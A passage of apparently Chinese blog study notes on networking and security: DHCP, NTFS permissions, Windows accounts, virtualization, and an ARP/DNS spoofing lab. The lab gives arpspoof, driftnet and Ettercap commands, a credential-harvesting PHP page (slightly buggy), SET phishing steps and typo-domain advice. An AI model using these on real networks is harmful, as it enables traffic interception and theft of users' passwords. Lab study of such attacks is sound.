2003</p><blockquote><p>注：Windows/Linux/三层交换机/路由器均可用来做DHCP服务器</p></blockquote><h3 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h3><ol><li><p>设置客户机及服务器的网络适配器改在同一个网络下(空),此时客户机的本地链接状态为无效IP<br><img src="https://pic.downk.cc/item/5e8ad502504f4bcb04eae332.png" alt=""><br><img src="https://pic.downk.cc/item/5e8ad51e504f4bcb04eafdef.png" alt=""></p></li><li><p>为服务器设置静态IP地址：<br>①点击打开本地连接属性<br>②点击Telnet协议<br><img src="https://pic.downk.cc/item/5e8ad52e504f4bcb04eb0f05.png" alt=""><br>③手动配置静态IP<br><img src="https://pic.downk.cc/item/5e8ad552504f4bcb04eb30d7.png" alt=""><br>上图手动配置的IP意思：该网段为10.1.1.0，服务器IP地址为10.1.1.1，默认客户机IP地址从10.1.1.2开始分配</p></li><li><p>在服务器中安装DHCP组件：<br>①点击我的电脑<br>②点击光驱(可移动设备)<br>③选择安装可选的Windows组件<br>④点击网络服务<br>⑤点击DHCP<br><img src="https://pic.downk.cc/item/5e8ad562504f4bcb04eb4514.png" alt=""><br>⑥确定</p></li><li><p>使用<font color="#fb8c00">netstat -an</font>查看所有和服务器建立连接的IP.DHCP服务器使用UDP67端口作为源端口，使用UDP68端口作为目的端口来广播信息<br><img src="https://pic.downk.cc/item/5e8ad686504f4bcb04ec6d78.png" alt=""></p></li><li><p>创建作用域(地址池)：<br>①点击-&gt;开始-&gt;管理工具-&gt;DHCP<br>②新建作用域<br><img src="https://pic.downk.cc/item/5e8ad69a504f4bcb04ec82d2.png" alt=""><br>③配置作用域-&gt;添加排除(可选)-&gt;设置租约期限-&gt;设置DHCP选项(DHCP选项指网关及DNS，可选)-&gt;指定网关(要与真实网关一样)-&gt;添加服务器IP地址-&gt;WINS服务器(已被淘汰，忽略)-&gt;激活作用域<br><img src="https://pic.downk.cc/item/5e8ad6ab504f4bcb04ec963c.png" alt=""></p></li><li><p>客户机连接服务器获得IP地址：<br>①右键点击本地连接选择启用<br><img src="https://pic.downk.cc/item/5e8ad725504f4bcb04ed122b.png" alt=""></p></li></ol><blockquote><p>注：如果客户机的IP地址不是由我们搭建的DHCP服务器分配的，可能是每个虚拟交换机有一个DHCP服务器。解决方法是点击编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;取消使用本地DHCP服务器将IP地址分配给虚拟机的对勾</p></blockquote><h3 id="DHCP命令"><a href="#DHCP命令" class="headerlink" title="DHCP命令"></a>DHCP命令</h3><h4 id="查看MAC地址"><a href="#查看MAC地址" class="headerlink" title="查看MAC地址"></a>查看MAC地址</h4><ol><li><p>客户机：</p><pre class=" language-bash"><code class="language-bash">ipconfig /all</code></pre><p><img src="https://pic.downk.cc/item/5e8ad743504f4bcb04ed2e72.png" alt=""></p></li><li><p>客户端：<br><img src="https://pic.downk.cc/item/5e8ad770504f4bcb04ed5964.png" alt=""></p></li></ol><h4 id="释放IP地址"><a href="#释放IP地址" class="headerlink" title="释放IP地址"></a>释放IP地址</h4><p>正常关机不会释放IP地址</p><pre class=" language-bash"><code class="language-bash">ipconfig /release</code></pre><h4 id="重新获取IP地址"><a href="#重新获取IP地址" class="headerlink" title="重新获取IP地址"></a>重新获取IP地址</h4><p>此命令也可以手动续约</p><pre class=" language-bash"><code class="language-bash">ipconfig /renew</code></pre><p>如果计算机当前无IP则此命令向服务器发送DHCP Discovery包，如果计算机已经有IP地址则此命令向服务器发送DHCP Request包</p><h2 id="保留地址"><a href="#保留地址" class="headerlink" title="保留地址"></a>保留地址</h2><p>每次都从地址池里拿出同样的IP地址给同一个人(通过MAC地址唯一标识)</p><h2 id="DHCP攻击与防御"><a href="#DHCP攻击与防御" class="headerlink" title="DHCP攻击与防御"></a>DHCP攻击与防御</h2><h3 id="攻击DHCP服务器"><a href="#攻击DHCP服务器" class="headerlink" title="攻击DHCP服务器"></a>攻击DHCP服务器</h3><p>方法：频繁发送伪造的DHCP请求，直到将DHCP地址池资源耗尽<br>防御：在交换机端口上(管理型)的端口上做动态MAC地址绑定(静态绑定用于银行、证券公司)</p><h3 id="攻击客户机"><a href="#攻击客户机" class="headerlink" title="攻击客户机"></a>攻击客户机</h3><p>方法：伪装DHCP服务器攻击，攻击者将自己部署为DHCP服务器，为用户提供非法IP地址<br>防御：在交换机上，除合法的服务器所在接口外，其他全部设置为禁止发送DHCP offer包</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTFS</title>
      <link href="/2020/03/03/ntfs/"/>
      <url>/2020/03/03/ntfs/</url>
      
        <content type="html"><![CDATA[<h2 id="NTFS定义"><a href="#NTFS定义" class="headerlink" title="NTFS定义"></a>NTFS定义</h2><ul><li>NTFS(New Technology File System)是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件可实现安全性，并支持跨越分区。(来自百度百科)</li><li>普通用户无法打开、修改系统文件，就是因为对系统文件进行了NTFS安全权限设置。</li></ul><h2 id="NTFS权限概述"><a href="#NTFS权限概述" class="headerlink" title="NTFS权限概述"></a>NTFS权限概述</h2><ol><li>通过设置NTFS权限，实现不同的用户访问不同对象(文件和文件夹)的权限</li><li>分配了正确的访问权限之后，用户才能访问其资源</li><li>设置权限防止资源被篡改、删除</li></ol><h2 id="文件系统概述"><a href="#文件系统概述" class="headerlink" title="文件系统概述"></a>文件系统概述</h2><h3 id="常见的文件系统"><a href="#常见的文件系统" class="headerlink" title="常见的文件系统"></a>常见的文件系统</h3><p>文件系统即在外部存储设备上组织文件的方法。(格式化其实就是重做文件系统)</p><ul><li>FAT windows</li><li>NTFS windows</li><li>EXT linux</li></ul><h3 id="NTFS文件系统的特点"><a href="#NTFS文件系统的特点" class="headerlink" title="NTFS文件系统的特点"></a>NTFS文件系统的特点</h3><p>以下特点都是FAT文件系统不具备的：</p><ol><li>提高磁盘读写性能</li><li>可靠性：加密文件系统、访问控制列表(设置权限)</li><li>磁盘利用率：压缩、磁盘配额(限制不同的用户的使用空间)</li><li>支持单个文件大于4G</li></ol><h2 id="修改NTFS权限"><a href="#修改NTFS权限" class="headerlink" title="修改NTFS权限"></a>修改NTFS权限</h2><h3 id="取消权限继承"><a href="#取消权限继承" class="headerlink" title="取消权限继承"></a>取消权限继承</h3><p>作用： 取消后，可以任意修改权限列表了<br>方法： 文件夹右键属性-&gt;安全-&gt;高级</p><h3 id="权限累加"><a href="#权限累加" class="headerlink" title="权限累加"></a>权限累加</h3><p>当用户同时属于多个组时，权限是累加的。</p><h3 id="拒绝最大"><a href="#拒绝最大" class="headerlink" title="拒绝最大"></a>拒绝最大</h3><p>当用户权限累加时，如遇到拒绝权限，拒绝最大。</p><h3 id="取得所有权"><a href="#取得所有权" class="headerlink" title="取得所有权"></a>取得所有权</h3><p>默认只有Administrator有这个权限。<br>作用：可以将任何文件夹的所有权改为Administrator</p><h3 id="强制继承"><a href="#强制继承" class="headerlink" title="强制继承"></a>强制继承</h3><p>作用：对下强制继承父子关系。(文件夹有的属性，文件夹里的文件都有)</p><h3 id="文件复制对文件的影响"><a href="#文件复制对文件的影响" class="headerlink" title="文件复制对文件的影响"></a>文件复制对文件的影响</h3><p>文件复制后，文件的权限会被目标文件夹的权限覆盖</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> NTFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户和组管理</title>
      <link href="/2020/02/28/user/"/>
      <url>/2020/02/28/user/</url>
      
        <content type="html"><![CDATA[<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="用户概述"><a href="#用户概述" class="headerlink" title="用户概述"></a>用户概述</h3><ol><li>每个用户登录后，拥有不同的操作权限</li><li>每个账户有自己唯一的SID(安全标识符)</li><li>不同的账户拥有不同的权限，为不同的账户赋权限就是给不同的账户的SID赋权限。</li><li>查看本机用户SID的命令：<font color="#fb8c00">whoami /user</font></li></ol><p>用户SID：S-1-5-21-426206823-2579496042-14852678-500<br>系统SID：S-1-5-21-426206823-2579496042-14852678</p><ul><li>用户UID：500</li><li>windows系统管理员administrator的UID是500，Linux管理员root的UID是0</li><li>普通用户的UID是从1000开始的</li></ul><ol start="5"><li>账户密码存储位置：<font color="#fb8c00">c:\windows\system32\config\SAM</font>  </li></ol><blockquote><p>注：密码采用HASH算法加密(不可逆)，渗透测试中可以采用暴力破解或撞库进行攻击，服务器系统的默认密码最长有效期为42天</p></blockquote><h3 id="内置账户"><a href="#内置账户" class="headerlink" title="内置账户"></a>内置账户</h3><ol><li>给人使用的账户：</li></ol><ul><li>administrator 管理员账户</li><li>guest 来宾账户</li></ul><ol start="2"><li>计算机服务组件相关的系统账户：</li></ol><ul><li>system 系统账户，最高权限</li><li>local services 本地服务账户，权限等同于普通用户</li><li>network services 网络服务账户，权限等同于普通用户</li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>每个用户都有自己的配置文件(家文件)，在用户第一次登陆时自动产生。</p><pre class=" language-bash"><code class="language-bash">win7/win2008 c:\用户\xp/win2003 c:\Documents and Settings\</code></pre><h2 id="用户相关DOS命令"><a href="#用户相关DOS命令" class="headerlink" title="用户相关DOS命令"></a>用户相关DOS命令</h2><ol><li><p>显示当前计算机的所有账户</p><pre class=" language-bash"><code class="language-bash">net user</code></pre></li><li><p>查看特定账户的信息</p><pre class=" language-bash"><code class="language-bash">net user 账户名</code></pre></li><li><p>修改账户密码(只有管理员可以使用)</p><pre class=" language-bash"><code class="language-bash">net user 账户名 新密码</code></pre></li><li><p>新建一个用户(不适用于Win7及以上版本)</p><pre class=" language-bash"><code class="language-bash">net user 账户名 密码 /add</code></pre></li><li><p>删除一个用户(不适用于Win7及以上版本)</p><pre class=" language-bash"><code class="language-bash">net user 账户名 /del</code></pre></li></ol><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2><h3 id="组概述"><a href="#组概述" class="headerlink" title="组概述"></a>组概述</h3><ol><li>组的作用：简化权限的赋予，相同权限的账户为同一个组</li><li>赋权限的方式：</li></ol><ul><li>用户–组–赋权限</li><li>用户–赋权限</li></ul><h3 id="内置组"><a href="#内置组" class="headerlink" title="内置组"></a>内置组</h3><p>内置组的权限已经默认被系统赋予：</p><ul><li>administrators(管理员组)</li><li>guests(来宾组)</li><li>users(普通用户组)</li><li>network(网络配置组)</li><li>print(打印机组)</li><li>Remote Desktop(远程桌面组)</li></ul><h3 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h3><ol><li><p>查看计算机所有本地组</p><pre class=" language-bash"><code class="language-bash">net localgroup</code></pre></li><li><p>查看特定组的所有成员</p><pre class=" language-bash"><code class="language-bash">net localgroup 组名</code></pre></li><li><p>向特定组中增加新的成员(不适用于Win7及以上版本)</p><pre class=" language-bash"><code class="language-bash">net localgroup 组名 用户名 /add</code></pre></li><li><p>增加新的组(不适用于Win7及以上版本)</p><pre class=" language-bash"><code class="language-bash">net localgroup 组名 /add</code></pre></li></ol><h2 id="服务器远程管理"><a href="#服务器远程管理" class="headerlink" title="服务器远程管理"></a>服务器远程管理</h2><p>远程管理类型：</p><ol><li>图形化远程管理</li><li>命令行远程管理</li></ol><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>客户机：Windows XP<br>服务器：Windows Server 2003<br>本实验使用XP远程控制2003，实验前，需要保证XP能ping通2003</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ul><li>Win2003：右键点击我的电脑-&gt;属性-&gt;远程-&gt;启用这台计算机的远程桌面-&gt;确定</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟化架构以及系统部署</title>
      <link href="/2020/02/22/vitrue/"/>
      <url>/2020/02/22/vitrue/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统运行模式"><a href="#操作系统运行模式" class="headerlink" title="操作系统运行模式"></a>操作系统运行模式</h2><h3 id="传统运行模式"><a href="#传统运行模式" class="headerlink" title="传统运行模式"></a>传统运行模式</h3><p>一台计算机同一时间只能运行一个操作系统。<br><img src="https://pic.downk.cc/item/5e50e728bb8bdc23de1fa63d.png" alt=""></p><h3 id="虚拟机运行架构"><a href="#虚拟机运行架构" class="headerlink" title="虚拟机运行架构"></a>虚拟机运行架构</h3><h4 id="寄居架构"><a href="#寄居架构" class="headerlink" title="寄居架构"></a>寄居架构</h4><p>寄居架构又称实验环境、测试环境(VMware Workstation)：</p><ol><li>虚拟机作为应用软件安装在操作系统上。</li><li>可以在此应用软件上安装多个操作系统。</li><li>以直接安装在硬件上的系统为宿主。<br><img src="https://pic.downk.cc/item/5e50e9e0bb8bdc23de201c04.png" alt=""></li></ol><h4 id="原生架构"><a href="#原生架构" class="headerlink" title="原生架构"></a>原生架构</h4><p>原生架构又称生产环境：(VMware vSphere)</p><ol><li>虚拟机软件直接安装在计算机硬件上。</li><li>虚拟机本身就是一个操作系统。</li><li>在这个虚拟机上可以同时运行多个操作系统。<br><img src="https://pic.downk.cc/item/5e50eae1bb8bdc23de205a8c.png" alt=""></li></ol><h2 id="虚拟机网络拓扑"><a href="#虚拟机网络拓扑" class="headerlink" title="虚拟机网络拓扑"></a>虚拟机网络拓扑</h2><p><img src="https://pic.downk.cc/item/5e8ad8ca504f4bcb04eec05a.png" alt=""></p><h3 id="虚拟机连物理网络"><a href="#虚拟机连物理网络" class="headerlink" title="虚拟机连物理网络"></a>虚拟机连物理网络</h3><ol><li>明确物理计算机的物理有线/无线网卡(通过控制面板-&gt;网络和Internet-&gt;网络共享中心-&gt;更改适配器设置)查看：</li></ol><ul><li>无线网卡为WLAN</li><li>有线网卡为以太网</li></ul><ol start="2"><li><p>打开虚拟机网络编辑器-&gt;更改设置：<br><img src="https://pic.downk.cc/item/5e8ad8ad504f4bcb04ee9e97.png" alt=""></p></li><li><p>设置该虚拟机为自动获取IP地址、DNS服务器地址(本地连接-&gt;属性-&gt;Internet协议-&gt;常规)</p></li><li><p>清除缓存：ipconfig /flushdns</p></li><li><p>重新启用本地连接</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间人攻击</title>
      <link href="/2020/02/13/zhongjianren/"/>
      <url>/2020/02/13/zhongjianren/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP协议的定义"><a href="#ARP协议的定义" class="headerlink" title="ARP协议的定义"></a>ARP协议的定义</h2><p>ARP协议(Address Resolution Protocol，地址解析协议)。在局域网中，网络中实际传输的是帧，帧里面有目标主机的MAC地址，在以太网中，一个主机要和另一个主机进行直接通信，必须知道目标主机的MAC地址。地址解析协议就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p><h2 id="ARP欺骗的危害"><a href="#ARP欺骗的危害" class="headerlink" title="ARP欺骗的危害"></a>ARP欺骗的危害</h2><p>ARP欺骗可以造成内部网络的混乱，让某些被欺骗的计算机无法正常访问内外网，让网关无法和客户端正常通信，也可以截取全网络的数据包。ARP地址冲突相较于IP地址冲突更隐蔽，因为ARP协议工作在IP的更低层，系统不会判断ARP缓存是否正确，无法像IP地址冲突那样给出提示。</p><h2 id="ARP欺骗的原理"><a href="#ARP欺骗的原理" class="headerlink" title="ARP欺骗的原理"></a>ARP欺骗的原理</h2><p>ARP欺骗的原理就是把自己的MAC地址伪造成网关的地址来欺骗其他的主机。<br><img src="https://pic.downk.cc/item/5e4e3c9648b86553eed852ce.png" alt=""><br>如上图所示，当主机A和主机B需要通信时，如果主机A在自己的ARP缓存表中没有找到主机B的MAC地址时，主机A将会向整个局域网中所有的计算机发送ARP广播，广播后整个局域网的计算机都收到了该数据报。此时，主机C响应主机A说我是主机B，主机A收到主机C发送的响应后就会更新自己的缓冲表，当主机A与主机B通信时，这些数据包就会发送到攻击主机(主机C)上。</p><h3 id="ARP攻击的分类"><a href="#ARP攻击的分类" class="headerlink" title="ARP攻击的分类"></a>ARP攻击的分类</h3><h4 id="ARP单向攻击"><a href="#ARP单向攻击" class="headerlink" title="ARP单向攻击"></a>ARP单向攻击</h4><p>掐断主机A与主机B之间的通信，比如主机C欺骗主机A说自己是主机B，那么主机A向主机B发送的数据包都会发送给主机C，但是主机B向主机A发送的数据包并没有中断，所以叫单向攻击</p><h4 id="ARP双向攻击"><a href="#ARP双向攻击" class="headerlink" title="ARP双向攻击"></a>ARP双向攻击</h4><p>当主机A想与主机B正常通信时，主机C对主机A说自己是主机B，主机C对主机B说自己是主机A，此种情况下主机AB的ARP缓存表都会被修改，以后主机A、B都会先发给主机C(如上图蓝线所示)。</p><blockquote><p>注：ARP攻击只能在同一个局域网中实现。因为在不同局域网中的主机互相访问需要用到网络层设备(路由器、三层交换机)，它们通过IP地址进行数据包之间的转发。</p></blockquote><h2 id="ARP实战"><a href="#ARP实战" class="headerlink" title="ARP实战"></a>ARP实战</h2><h3 id="ARPspoof"><a href="#ARPspoof" class="headerlink" title="ARPspoof"></a>ARPspoof</h3><p>ARPspoof是一套名为dsniffer的工具。arpspoof是其中一个模块。</p><h3 id="arpspoof的用法"><a href="#arpspoof的用法" class="headerlink" title="arpspoof的用法"></a>arpspoof的用法</h3><pre><code>arpspoof - 拦截交换局域网上的数据包arpspoof [ -i interface ] [ -c own | host | both ] [ -t target ] [ -r ] host</code></pre><p>参数解释：</p><ul><li><font color="#fb8c00">-i</font> 指定网卡接口，如eth0</li><li><font color="#fb8c00">-c</font> 指定恢复arp配置时使用的硬件地址</li><li><font color="#fb8c00">-t</font> 指定目标主机的IP地址，默认为所在局域网的所有主机</li><li><font color="#fb8c00">-r</font> 捕获两个方向上的流量</li></ul><h3 id="单向攻击"><a href="#单向攻击" class="headerlink" title="单向攻击"></a>单向攻击</h3><pre class=" language-bash"><code class="language-bash">靶机：Windows XP , ip:192.168.85.132攻击主机：Kali , ip:192.168.85.128</code></pre><h4 id="检查两个主机的网络状况"><a href="#检查两个主机的网络状况" class="headerlink" title="检查两个主机的网络状况"></a>检查两个主机的网络状况</h4><p>在终端对两个计算机执行以下命令</p><pre><code>ping www.baidu.com</code></pre><p>若ping通证明网络状况良好</p><h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><ol><li>开始ARP数据劫持，此条命令会给靶机造成断网假象：<pre class=" language-bash"><code class="language-bash">arpspoof -t 192.168.85.132 192.168.85.2</code></pre></li></ol><blockquote><p>注意：192.168.85.2为网关IP</p></blockquote><ol start="2"><li><p>端口转发,此时靶机网络恢复正常：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv4/ip_forward</code></pre></li><li><p>开始图片嗅探：</p><pre class=" language-bash"><code class="language-bash">driftnet -i eth0</code></pre></li></ol><h2 id="ARP攻击防御"><a href="#ARP攻击防御" class="headerlink" title="ARP攻击防御"></a>ARP攻击防御</h2><h3 id="静态绑定网关MAC"><a href="#静态绑定网关MAC" class="headerlink" title="静态绑定网关MAC"></a>静态绑定网关MAC</h3><ol><li><p>新建一个MAC-IP对应表文件，将要绑定的IP-MAC地址写入文件中：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'192.168.85.2 XX:XX:XX:XX:XX:XX'</span> <span class="token operator">></span> /etc/ip-mac</code></pre></li><li><p>设置开机自动绑定</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'arp -f /etc/ip-mac'</span> <span class="token operator">>></span> /etc/rc.d/rc.local</code></pre></li></ol><h3 id="ARP防火墙"><a href="#ARP防火墙" class="headerlink" title="ARP防火墙"></a>ARP防火墙</h3><p>使用ARP防火墙可以有效防御ARP攻击</p><h3 id="VLAN和交换机端口绑定"><a href="#VLAN和交换机端口绑定" class="headerlink" title="VLAN和交换机端口绑定"></a>VLAN和交换机端口绑定</h3><p>通过划分VLAN和交换机端口绑定，以图防范ARP。划分VLAN，减小广播域的范围，使ARP在小范围内起作用，而不至于发送大面积影响。</p><h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><h3 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h3><p><img src="https://pic.downk.cc/item/5e8eb5f0504f4bcb040b1240.png" alt=""><br>三台计算机需要互相ping通，kali需要修改DNS服务器指向2003才能ping:</p><pre class=" language-bash"><code class="language-bash">vim /etc/resolv.conf<span class="token comment" spellcheck="true">#在打开的文件中加入</span>nameserver DNS服务器IP地址  <span class="token comment" spellcheck="true">#保存退出 </span><span class="token function">service</span> networking restart</code></pre><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用中间人攻击的原理，kali将自己伪装成DNS服务器，诱导客户机指向自己解析域名，从而实现欺骗。</p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="网页拷贝"><a href="#网页拷贝" class="headerlink" title="网页拷贝"></a>网页拷贝</h5><p>利用kali内置的httrack工具拷贝网页(详见渗透测试知识点2)</p><h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><p>把2003当作网站的官方发布服务器，即需要在2003上搭建IIS/DNS(详情请参阅IIS篇/DNS篇)。此时XP可以通过域名(如 <a href="http://www.materialize.com" target="_blank" rel="noopener">www.materialize.com</a> )访问2003的网页</p><h5 id="使用Kali进行攻击"><a href="#使用Kali进行攻击" class="headerlink" title="使用Kali进行攻击"></a>使用Kali进行攻击</h5><ol><li>伪装DNS服务器，使用Ettercap的DNS投毒法：<pre class=" language-bash"><code class="language-bash">vim /etc/ettercap/etter.dns</code></pre></li></ol><p><img src="https://pic.downk.cc/item/5e93f766c2a9a83be5bf61e4.png" alt=""><br>如果想将所有域名的解析服务器都指向Kali，则将上述域名部分改为* 即可，即<font color="#fb8c00">* A 10.1.1.22</font></p><ol start="2"><li><p>运用Kali内置的Apache发布一个假的materialize网站</p><pre class=" language-bash"><code class="language-bash">systemctl start apache2<span class="token function">netstat</span> -antpl   <span class="token comment" spellcheck="true">#查看本机所有开启的TCP服务，如果有80端口则证明apache服务成功开启</span></code></pre><p>进入Apache的站点存放文件夹，并删除文件夹里所有文件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /var/www/html<span class="token function">rm</span>  -rf *</code></pre></li><li><p>在拷贝的网站文件夹里新建两个文件(一个php文件/一个txt文件)：php文件用于获取表单数据，txt文件用于将php读取的字符串写入。<br><img src="https://pic.downk.cc/item/5e9404ddc2a9a83be5c6ee44.png" alt=""></p></li></ol><p>.php</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php/*stripslashes是提取表单值，post后是input标签里name的内容*/<span class="token variable">$name</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$pass</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"捕获的账号和密码"</span><span class="token keyword">.</span><span class="token string">"用户名"</span><span class="token keyword">.</span><span class="token variable">$name</span><span class="token keyword">.</span><span class="token string">"密码"</span><span class="token keyword">.</span><span class="token variable">$number</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> @fopen<span class="token punctuation">(</span><span class="token string">"1.txt"</span>, <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  /*以追加的方式打开1.txt文件*/        @fwrite<span class="token punctuation">(</span><span class="token variable">$file</span>, <span class="token string">"<span class="token variable">$content</span>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  /*在文件中写入字符串*/?<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>        <span class="token keyword">function</span> goBack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            window.history.back<span class="token punctuation">(</span><span class="token punctuation">)</span>   //后退+刷新            alert<span class="token punctuation">(</span><span class="token string">"连接错误，请重新输入"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token string">"goBack()"</span><span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">!</span>-- 加载后立即执行此javascript代码--<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><ol start="4"><li>进入apache站点文件夹下，将文件夹拷贝到apache站点文件夹下(此处的html必须命名为index.html，否则Apache将无法识别)<pre class=" language-bash"><code class="language-bash"><span class="token function">cp</span> -r /root/Desktop/materialize/* ./</code></pre></li></ol><ul><li><font color="#fb8c00">-r</font> 包括文件夹一起拷贝</li><li><font color="#fb8c00">./</font> 此文件夹下</li></ul><ol start="5"><li><p>修改文件权限<br>使用以下命令查看文件权限：<br><img src="https://pic.downk.cc/item/5e940a1ac2a9a83be5c9bae8.png" alt=""><br>Apache属于其他组，所以要使用以下命令改变权限:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 777 1.txt   //7转换为二进制为111,对应上述3个字母设置一组权限，1激活该权限，777表示将三个用户组的权限设为rwx</code></pre><p><img src="https://pic.downk.cc/item/5e940b30c2a9a83be5ca677a.png" alt=""></p></li><li><p>使用Ettercap进行ARP投毒(ARP攻击，此时客户机访问服务器的数据会经过kali)<br><img src="https://pic.downk.cc/item/5e941134c2a9a83be5cde948.png" alt=""></p></li><li><p>使用Ettercap进行DNS投毒：Plugins-&gt;manage Plugins<br><img src="https://pic.downk.cc/item/5e941238c2a9a83be5ce76a9.png" alt=""></p></li></ol><h3 id="使用SET攻击进行钓鱼攻击"><a href="#使用SET攻击进行钓鱼攻击" class="headerlink" title="使用SET攻击进行钓鱼攻击"></a>使用SET攻击进行钓鱼攻击</h3><p>在kali中打开SET工具集：</p><pre class=" language-bash"><code class="language-bash">setoolkit</code></pre><h4 id="使用SET截获密码"><a href="#使用SET截获密码" class="headerlink" title="使用SET截获密码"></a>使用SET截获密码</h4><p>根据菜单提示依次选择1.Social-Engineering Attacks -&gt; 2.Web Site Attack Vectors -&gt; 3.Credencial Harvester Attack Method -&gt; 2.Site Cloner ,输入要拷贝的网站的网址(拷贝下来的网站只包含静态内容)，然后在客户机的搜索栏上输入kali网址对钓鱼网站进行访问。此种模式用于截获客户输入的用户名和密码，当输入成功后，网页会自动刷新到真正的官方网站。</p><blockquote><p>注：此方法若想使用域名进行访问，要搭建一个DNS服务器使其域名指向kali，同时，如果我们拷贝的是 <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> ，钓鱼网站的域名最好类似<a href="http://www.googel.com" target="_blank" rel="noopener">www.googel.com</a> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> kali </tag>
            
            <tag> SET </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(7)</title>
      <link href="/2019/12/08/python7/"/>
      <url>/2019/12/08/python7/</url>
      
        <content type="html"><![CDATA[<h2 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h2><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>设计模式是前人工作的总结和提炼，通常，广泛流传的设计模式都是针对某一特定问题的成熟解决方案</p><h3 id="单例设计模式-1"><a href="#单例设计模式-1" class="headerlink" title="单例设计模式"></a>单例设计模式</h3><ul><li>目的：让类创建对象，在系统中只有唯一个实例对象</li><li>每一侧执行<font color="#fb8c00">类名()</font>返回的对象、内存地址都是相同的</li></ul><h4 id="单例设计模式的应用场景"><a href="#单例设计模式的应用场景" class="headerlink" title="单例设计模式的应用场景"></a>单例设计模式的应用场景</h4><ul><li>音乐播放对象(同一时间只能播放一首歌曲)</li><li>回收站对象(在一个操作系统中只有一个回收站)</li><li>打印机对象(打印10份文件只需要一个打印机)<br>以上对象只有唯一的一个存在</li></ul><h3 id="new-方法"><a href="#new-方法" class="headerlink" title="new 方法"></a><strong>new</strong> 方法</h3><ol><li>使用<font color="#fb8c00">类名()</font>创建对象时，Python的解释器首先会调用<strong>new</strong> 方法为对象分配空间，<strong>new</strong> 方法是一个由Object类提供的内置静态方法，主要作用有两个：</li></ol><ul><li>在内存中为对象分配空间</li><li>返回对象的引用</li></ul><ol start="2"><li>在获得对象的引用后，将此引用作为第一个参数，传递给<strong>init</strong>方法</li></ol><h4 id="new-方法的重写"><a href="#new-方法的重写" 